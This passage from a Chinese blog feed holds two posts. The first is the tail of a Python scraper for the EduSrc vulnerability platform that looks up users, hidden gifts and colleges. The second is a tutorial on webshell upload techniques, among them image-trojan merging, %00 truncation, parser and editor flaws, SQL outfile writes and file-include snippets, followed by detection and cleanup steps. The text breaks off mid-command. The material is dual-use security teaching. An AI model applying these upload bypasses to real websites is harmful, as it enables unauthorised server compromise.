class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exact_search</span>(<span class="params">numEnd</span>):</span>     <span class="comment"># 精确查找用户</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        name = <span class="built_in">input</span>(<span class="string">&quot;%s【精确查询】%s &gt;&gt; 将查找的用户名：&quot;</span>%(yellow, end))</span><br><span class="line">        <span class="keyword">if</span> name != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    url = baseUrl + <span class="string">&#x27;/user/sum/?page=&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s将查询页数总共：%s %s&quot;</span> % (blue, numEnd, end))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(numStart, numEnd + <span class="number">1</span>)):</span><br><span class="line">        Surl = url + <span class="built_in">str</span>(i)</span><br><span class="line">        res = requests.get(url=Surl, headers=headers)</span><br><span class="line">        data_html = etree.HTML(res.text)</span><br><span class="line">        name_list = data_html.xpath(<span class="string">&#x27;//div[@id=&quot;show_list&quot;]/table/tr[@class=&quot;row&quot;]/td[2]/a/text()&#x27;</span>)</span><br><span class="line">        level_list = data_html.xpath(<span class="string">&#x27;//*[@id=&quot;show_list&quot;]/table/tr[@class=&quot;row&quot;]/td[3]/span/text()&#x27;</span>)</span><br><span class="line">        rank_list = data_html.xpath(<span class="string">&#x27;//*[@id=&quot;show_list&quot;]/table/tr[@class=&quot;row&quot;]/td[1]/text()&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            list_name = <span class="built_in">str</span>(name_list[j]).strip()      <span class="comment"># 去前后空格</span></span><br><span class="line">            <span class="keyword">if</span> name == list_name:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n%s【+】目标在第 %s 页：%s\t称号：%s\t排名：%s%s\n&quot;</span> % (green, i, name_list[j], level_list[j], rank_list[j], end))</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><h2 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h2><div class="note info no-icon flat"><p>考虑到使用者对用户名可能出现的一些情况：健忘、碎片记忆、找茬等等（bushi），特别设置了模糊查询(主要是回顾正则的学习嘻嘻)</p></div><p>模糊查询对于使用者输入字符可以进行判断校验，需要满足的条件有：</p><ol><li>自动匹配不完整字符输入</li><li>可选择忽略字母大小写</li></ol><p>利用了<code>正则表达式</code>对其进行一个判断筛选，将使用者输入的字符<code>融入</code>到正则表达式中，再对获取到的数据进行<code>匹配</code>。</p><p>这里获取到的数据是通过<code>Xpath</code>提取出来的<code>列表</code>，可通过<code>for循环</code>遍历列表元素逐一进行匹配筛选。</p><p>搜索到的模糊用户名会储存在<code>自定义文件search.txt</code>中，并显示详细信息，遍历用户不会中途停止，搜索完成后会显示具体的<code>数据统计结果</code>。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;用户名：&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 忽略字母大小写</span></span><br><span class="line">result = re.match(<span class="string">&#x27;(.*)&#x27;</span> + name + <span class="string">&#x27;(.*)&#x27;</span>, 获取的数据)   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 不忽略字母大小写</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(.*)&#x27;</span> + name + <span class="string">&#x27;(.*)&#x27;</span>, re.I) </span><br><span class="line">result = pattern.search( 获取的数据 )</span><br></pre></td></tr></table></figure></p><p>效果图如下👇<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220208/eduSrc_img3.4wsmppzamck0.jpg" alt="模糊查询"></p><p>具体自定义函数代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fuzzy_search</span>(<span class="params">file, numEnd</span>):</span>     <span class="comment"># 模糊查找用户</span></span><br><span class="line">    is_empty(file)    <span class="comment"># 判断文件内是否为空、有数据</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            name = <span class="built_in">input</span>(<span class="string">&quot;%s【模糊查询】%s &gt;&gt; 将查找的用户名：&quot;</span>%(yellow, end))</span><br><span class="line">            <span class="keyword">if</span> name != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    is_ignoreCase = <span class="built_in">input</span>(<span class="string">&#x27;是否忽略字母大小写(默认)y/n？&#x27;</span>).lower()</span><br><span class="line">    url = baseUrl + <span class="string">&#x27;/user/sum/?page=&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s将查询页数总共：%s \n&quot;</span></span><br><span class="line">          <span class="string">&quot;正在搜索，请耐心等候(查找到的相似用户名会在文件%s内详细显示)...%s&quot;</span> % (blue, numEnd, file, end))</span><br><span class="line">    userNum = <span class="number">0</span>     <span class="comment"># 人数记数（顺便的）</span></span><br><span class="line">    count = <span class="number">0</span>       <span class="comment"># 查找到的类似用户数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numStart, numEnd + <span class="number">1</span>):</span><br><span class="line">        Surl = url + <span class="built_in">str</span>(i)</span><br><span class="line">        res_data = requests.get(url=Surl, headers=headers)</span><br><span class="line">        data_html = etree.HTML(res_data.text)</span><br><span class="line">        name_list = data_html.xpath(<span class="string">&#x27;//div[@id=&quot;show_list&quot;]/table/tr[@class=&quot;row&quot;]/td[2]/a/text()&#x27;</span>)</span><br><span class="line">        level_list = data_html.xpath(<span class="string">&#x27;//*[@id=&quot;show_list&quot;]/table/tr[@class=&quot;row&quot;]/td[3]/span/text()&#x27;</span>)</span><br><span class="line">        rank_list = data_html.xpath(<span class="string">&#x27;//*[@id=&quot;show_list&quot;]/table/tr[@class=&quot;row&quot;]/td[1]/text()&#x27;</span>)</span><br><span class="line">        rankNum = <span class="number">0</span>  <span class="comment"># 记数</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> name_list:</span><br><span class="line">            <span class="keyword">if</span> is_ignoreCase == <span class="string">&quot;n&quot;</span>:        <span class="comment"># 忽略字母大小写</span></span><br><span class="line">                result = re.match(<span class="string">&#x27;(.*)&#x27;</span> + name + <span class="string">&#x27;(.*)&#x27;</span>, <span class="built_in">str</span>(j))</span><br><span class="line">            <span class="keyword">else</span>:                           <span class="comment"># 不忽略字母大小写（默认）</span></span><br><span class="line">                pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(.*)&#x27;</span> + name + <span class="string">&#x27;(.*)&#x27;</span>, re.I)</span><br><span class="line">                result = pattern.search(<span class="built_in">str</span>(j))</span><br><span class="line">            <span class="comment"># print(j, type(result))</span></span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                findName = result.group()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] 第 %s%s%s 页发现类似用户名：%s%s%s&quot;</span> % (green, i, end, green, findName, end))</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(<span class="string">&quot;第 %s 页：\t%s \t称号：%s\t排名：%s\n&quot;</span> % (i, findName, level_list[rankNum], rank_list[rankNum]))</span><br><span class="line">            rankNum += <span class="number">1</span></span><br><span class="line">            userNum += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n%s查找用户人数共 %s，总计发现了%s个相似用户名%s\n&quot;</span> % (green, userNum, count, end))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n%s很遗憾，未找到相似用户名%s\n&quot;</span> % (red, end))</span><br></pre></td></tr></table></figure></p><h1 id="针对礼品"><a href="#针对礼品" class="headerlink" title="针对礼品"></a>针对礼品</h1><div class="note warning flat"><p>平台某个礼品在没有库存时，并不会进行下架操作，但会在客户端中隐藏起来，可通过url查找。</p></div><p>我们可以通过脚本搜索到所有礼品，包括<code>没有库存</code>的，并进行一个区分统计。</p><p>因为不知道礼品具体有多少个，为了方便设置，就在<code>main函数</code>中，把参数设为<code>全局</code>变量<code>expectedGiftNum</code>，这里可自设一个数进行遍历（据说150可以遍历到所有）</p><p>查询到的礼品详细信息会保存在<code>自定义文件gift.txt</code>中。</p><p>效果图如下👇<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220208/eduSrc_img5.4xc4kdfbwow0.jpg" alt="礼品搜索"></p><p>具体代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift_search</span>(<span class="params">file</span>):</span>      <span class="comment"># 查询未下架礼品</span></span><br><span class="line">    is_empty(file)      <span class="comment"># 判断文件内是否为空、有数据</span></span><br><span class="line">    url = baseUrl + <span class="string">&#x27;/gift/&#x27;</span></span><br><span class="line">    count = <span class="number">0</span>               <span class="comment"># 未下架数量</span></span><br><span class="line">    buyNum = <span class="number">0</span>              <span class="comment"># 可买数量</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s预计礼品数（可设）：%s \n&quot;</span></span><br><span class="line">          <span class="string">&quot;正在搜索，请耐心等候(查询到的礼品会在文件%s内详细显示)...%s&quot;</span> % (blue, expectedGiftNum, file, end))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(expectedGiftNum)):</span><br><span class="line">        gift_url = url + <span class="built_in">str</span>(i)</span><br><span class="line">        res = requests.get(url=gift_url, headers=headers)</span><br><span class="line">        html = etree.HTML(res.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Not Found&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="comment"># print(&#x27;[+]%s success&#x27; % gift_url)</span></span><br><span class="line">            giftName = html.xpath(<span class="string">&#x27;/html/body/div/div/div[1]/div/div/div[1]/div[2]/text()&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">            num = html.xpath(<span class="string">&#x27;/html/body/div/div/div[1]/div/div/div[3]/div[2]/span/strong/text()&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">            coins = html.xpath(<span class="string">&#x27;/html/body/div/div/div[1]/div/div/div[2]/div[2]/text()&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(num) != <span class="number">0</span>:</span><br><span class="line">                buyNum += <span class="number">1</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(giftFile, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(gift_url + <span class="string">&quot;\t\t库存&quot;</span> + num + <span class="string">&quot;\t\t&quot;</span> + coins + <span class="string">&quot;\t\t&quot;</span> + giftName + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n%s共有：%s 个未下架， 其中 %s 个可买，%s 个已无库存%s\n&quot;</span> % (yellow, count, buyNum, count - buyNum, end))</span><br></pre></td></tr></table></figure></p><h1 id="针对高校"><a href="#针对高校" class="headerlink" title="针对高校"></a>针对高校</h1><p>本来的想法是想弄这个模式的二级菜单：<code>全国内</code>、<code>各省份</code>，但发现两个代码有点类似，感觉全国内那个单独分开有点冗余，于是就把它们合在一个查找中。</p><p>效果图如下👇<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220208/eduSrc_img4.2knhfp19ifs0.jpg" alt="高校搜索"></p><p>具体代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collegeFind</span>(<span class="params">choice</span>):</span>      <span class="comment"># 各区域/省份查找</span></span><br><span class="line">    url = baseUrl + <span class="string">&#x27;/rank/firm/&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s正在获取各区域/省份信息....%s&#x27;</span>%(blue, end))</span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    data_html = etree.HTML(res.text)</span><br><span class="line">    provinceList = data_html.xpath(<span class="string">&#x27;//*[@id=&quot;id_province&quot;]/option/text()&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(provinceList)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>. <span class="subst">&#123;provinceList[i]&#125;</span>&#x27;</span>, end=<span class="string">&quot;\t&quot;</span>*<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> (i+<span class="number">1</span>)%<span class="number">6</span> == <span class="number">0</span> <span class="keyword">or</span> i == <span class="built_in">len</span>(provinceList)-<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            province_id = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入高校所在区域/省份对应编号：&#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> province_id &lt; <span class="number">0</span> <span class="keyword">or</span> province_id &gt;= <span class="built_in">len</span>(provinceList):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;%s输入超出限制！%s&#x27;</span>%(red, end))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n%s【%s】 &gt;&gt;%s 将查找的高校名：&quot;</span>%(green, provinceList[province_id], end), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    college_name = <span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    numEnd = get_numEnd(choice, province_id)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(numStart, numEnd+<span class="number">1</span>)):</span><br><span class="line">        search_url = url + <span class="string">&#x27;?province=%s&amp;page=%s&#x27;</span> % (province_id, i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            ress = requests.get(url=search_url, headers=headers)</span><br><span class="line">            data_html = etree.HTML(ress.text)</span><br><span class="line">            schoolNameList = data_html.xpath(<span class="string">&#x27;/html/body/div/div/div[1]/div/div/table/tr[*]/td[2]/a/text()&#x27;</span>)</span><br><span class="line">            bugNumList = data_html.xpath(<span class="string">&#x27;/html/body/div/div/div[1]/div/div/table/tr[@class=&quot;row&quot;]/td[3]/text()&#x27;</span>)</span><br><span class="line">            bugThreatList = data_html.xpath(<span class="string">&#x27;/html/body/div/div/div[1]/div/div/table/tr[@class=&quot;row&quot;]/td[4]/text()&#x27;</span>)</span><br><span class="line">            <span class="comment"># print(schoolNameList[1].strip(), len(schoolNameList))</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(schoolNameList)):</span><br><span class="line">                schoolName = schoolNameList[j].strip()  <span class="comment"># 去前后空格</span></span><br><span class="line">                <span class="keyword">if</span> schoolName == college_name:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;%s【+】目标【%s】在【%s】列表中第 %s 页, 第 %s 个，id为%s，漏洞总数为%s，漏洞威胁值为%s%s\n&#x27;</span></span><br><span class="line">                        % (green, college_name, provinceList[province_id], i, j+<span class="number">1</span>, (i-<span class="number">1</span>)*<span class="number">15</span>+(j+<span class="number">1</span>), bugNumList[j], bugThreatList[j], end))</span><br><span class="line">                    flag = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag != <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s【*】查询不到该高校信息，可能是高校名错误或暂未收录%s\n&#x27;</span> % (red, end))</span><br></pre></td></tr></table></figure></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这个脚本是<code>一时兴起</code>写的，很多情况可能没有考虑到，但总体效果达到我的<code>预期</code>了。<br>其他小的自定义函数这里就不贴了，没啥好说的。<br>如果对搜索速度有要求的小伙伴可以尝试加点<code>线程</code>提高速度。</p><div class="note success flat"><p>感兴趣的小伙伴可以自行去github中 <a href="https://github.com/ZekerTop/EduSrc">查看完整源码</a></p></div>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> eduSrc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebShell（3）| 木马上传方式及查杀防范</title>
      <link href="/posts/77d4ef29/"/>
      <url>/posts/77d4ef29/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="木马上传方式"><a href="#木马上传方式" class="headerlink" title="木马上传方式"></a>木马上传方式</h1><h2 id="直接上传"><a href="#直接上传" class="headerlink" title="直接上传"></a>直接上传</h2><p>通过直接上传一句话木马获取webShell。</p><h2 id="数据库备份webShell"><a href="#数据库备份webShell" class="headerlink" title="数据库备份webShell"></a>数据库备份webShell</h2><p>网站进制上传可执行文件，此时我们可以上传正常的<code>图片马</code>，然后通过数据库备份功能修改备份后的文件名，使得<code>图片马</code>能够成功解析执行。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy/b 1.jpg+1.txt 2.jpg   # 将文件写入图片中，这里的文件不局限于txt文件</span><br></pre></td></tr></table></figure></p><p>有时候数据库备份功能对备份的地址做了前端的限制，只需修改前端源码，成功绕过。</p><h2 id="突破本地js验证webShell"><a href="#突破本地js验证webShell" class="headerlink" title="突破本地js验证webShell"></a>突破本地js验证webShell</h2><p>若网站对上传只做了前端限制，可以通过修改前端代码或者删除检测代码，还可以通过抓包改包成功上传一句话木马。</p><h2 id="上传其他脚本webShell"><a href="#上传其他脚本webShell" class="headerlink" title="上传其他脚本webShell"></a>上传其他脚本webShell</h2><p>有时候一台服务器上由于搭建了不同脚本的几个网站，导致服务可同时执行多种脚本，此时我们可以尝试上传其他脚本来绕过对某一脚本的限制。</p><h2 id="00截断webShell"><a href="#00截断webShell" class="headerlink" title="00截断webShell"></a>00截断webShell</h2><p>00截断是利用服务器对%00后面的字符不再识别，导致攻击者可构造<code>%00</code>之前的后缀名为可执行文件，成功绕过<code>白名单限制</code>。</p><h2 id="解析漏洞webShell"><a href="#解析漏洞webShell" class="headerlink" title="解析漏洞webShell"></a>解析漏洞webShell</h2><p>利用不同服务器存在的解析漏洞成功绕过后缀名限制上传。如<code>IIS</code>、<code>apache</code>、<code>nginx</code>等</p><h2 id="利用编辑器漏洞webShell"><a href="#利用编辑器漏洞webShell" class="headerlink" title="利用编辑器漏洞webShell"></a>利用编辑器漏洞webShell</h2><p>有些网站在编辑界面应用了存在已知漏洞的编辑器，可利用漏洞直接getShell，或者配合解析漏洞上传木马getShell。如<code>fckeditor</code>、<code>ewebeditor</code>、<code>cheditor</code>等</p><h2 id="网站配置插马webShell"><a href="#网站配置插马webShell" class="headerlink" title="网站配置插马webShell"></a>网站配置插马webShell</h2><p>一些网站在后台存在网站配置，比如配置网站首页公司名称等信息，此处可直接插入一句话木马。配置界面插马要非常小心，最好下载源码，分析源码闭合代码插入一句话，防止网站被插废。</p><h2 id="通过编辑模板webShell"><a href="#通过编辑模板webShell" class="headerlink" title="通过编辑模板webShell"></a>通过编辑模板webShell</h2><p>通过对网站的模板编辑写入一句换，利用解析漏洞生成脚本getShell</p><p>还可以将一句换木马打包为压缩文件，上传后解压到网站成功getShell</p><h2 id="修改脚本文件直接getShell"><a href="#修改脚本文件直接getShell" class="headerlink" title="修改脚本文件直接getShell"></a>修改脚本文件直接getShell</h2><p>有的网站管理员可以修改脚本，攻击者可在脚本中插入一句话木马成功getShell</p><h2 id="数据库命令执行webShell"><a href="#数据库命令执行webShell" class="headerlink" title="数据库命令执行webShell"></a>数据库命令执行webShell</h2><p>有的网站管理员可直接在前端执行sql语句，此时我们可以通过创建数据库写入一句话，再将一句话导出到网站根目录，连接getShell</p><h2 id="文件包含webShell"><a href="#文件包含webShell" class="headerlink" title="文件包含webShell"></a>文件包含webShell</h2><p>当防火墙对可执行脚本过滤比较严格时，可以通过文件包含的方式绕过。</p><p>首先上传一张图片马（后缀为jpg/png等网站允许上传的格式），然后上传包含可执行文件，将上传的文件包含进去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include( &quot;xxx.jpg&quot;);?&gt;       # php</span><br><span class="line">&lt;!--#include file=&quot;xxx.jpg&quot;--&gt;     # asp</span><br></pre></td></tr></table></figure><h2 id="命令执行webShell"><a href="#命令执行webShell" class="headerlink" title="命令执行webShell"></a>命令执行webShell</h2><p>网站存在可执行命令的地方可直接用<code>echo</code>函数写入一句。</p><h2 id="Sql注入webShell"><a href="#Sql注入webShell" class="headerlink" title="Sql注入webShell"></a>Sql注入webShell</h2><p>存在sql注入的网站，如果有足够的权限并且可以得到绝对路径，我们就可以直接使用<code>select into......outfile</code>函数直接写入一句话到网站根目录。</p><h1 id="木马查杀防范"><a href="#木马查杀防范" class="headerlink" title="木马查杀防范"></a>木马查杀防范</h1><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>针对一句话木马</span></div>    <div class="hide-content"><ol><li><p>日志排查<br>针对Webshell正在使用的常见关键字过滤服务器访问和错误日志，包括文件名称和/或参数名称。<br>根据下面的示例，在Apache HTTP Server访问日志中的URL中搜索字符串文件。<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/1.492nhtavxti0.jpg" alt="1.png"></p></li><li><p>文件系统搜索<br>文件系统（通常是Web服务器根目录）中搜索文件或文件名中的通用字符串。<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/2.3u5j4t9b79i0.jpg" alt="2.png"><br>如果搜索到很长的字符串，这可能表示已进行了编码。一些后门程序具有数千行代码。<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/3.570zga084ek0.jpg" alt="3.png"></p></li><li><p>搜索最近X天修改过的文件<br> 我们可以通过搜索了前一天或前一小时更改的*.php文件来进行排查</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name *.php -mtime -1 -ls    # 搜索前一天</span><br><span class="line">find / -name *.php -mmin -60 -ls    # 搜索前一小时</span><br></pre></td></tr></table></figure><p> 但建议搜索所有更改过的文件，毕竟webShell也可以嵌入到图像或任何其他文件中。</p></li><li><p>.htaccess文件的分析<br>分析<code>.htaccess</code>文件是否进行了修改。以下是攻击者可能对.htaccess文件进行更改的示例<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/4.4qjxp5zgmzs0.jpg" alt="4.png"></p></li><li><p>监控异常流量<br>监视网络中存在异常的网络流量和连接。<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220110/5.2gnmmeyy4x34.jpg" alt="5.png"></p></li><li><p>借助软件查杀<br>下载网站源码至本地，通过<code>D盾</code>、<code>Seay源代码审计系统</code>等软件进行查杀</p></li></ol></div></div><div class="hide-toggle" style="border: 1px solid  #fff8e9"><div class="hide-button toggle-title" style="background-color:  #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>针对内存马（不死马）</span></div>    <div class="hide-content"><p>由于内存马，即不死马，具有无文件落地、极难检测和发现等特性，难以清除。<br>针对不死马，我们有以下方法可以进行检测</p><ol><li><p>重启服务器<br> 简单粗暴，重启服务器，然后删除木马文件。但大多数awd比赛会因为<code>重启失分</code>，所以不能频繁重启服务。</p></li><li><p>日志的排查<br> 在上面的一句话木马的检测排查的基础上，重点关注一些<code>不明路径</code>以及它的<code>出现频率</code>，可通过此查看其木马文件名。</p></li><li><p>重写木马文件<br>我们可以通过不断向木马文件重写来克制，前提是写入速度要<code>大于</code>不死马的生成速度，且已知<code>木马文件名</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     set_time_limit(<span class="number">0</span>);</span><br><span class="line">     ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">     unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">     <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">         file_put_contents(<span class="string">&#x27;./shell.php&#x27;</span>,<span class="string">&#x27;11111&#x27;</span>);</span><br><span class="line">         usleep(<span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>bash脚本删除<br> 通过编写bash脚本不断的进行删除木马文件，前提是已知<code>木马文件名</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> : ;<span class="keyword">do</span> rm -rf 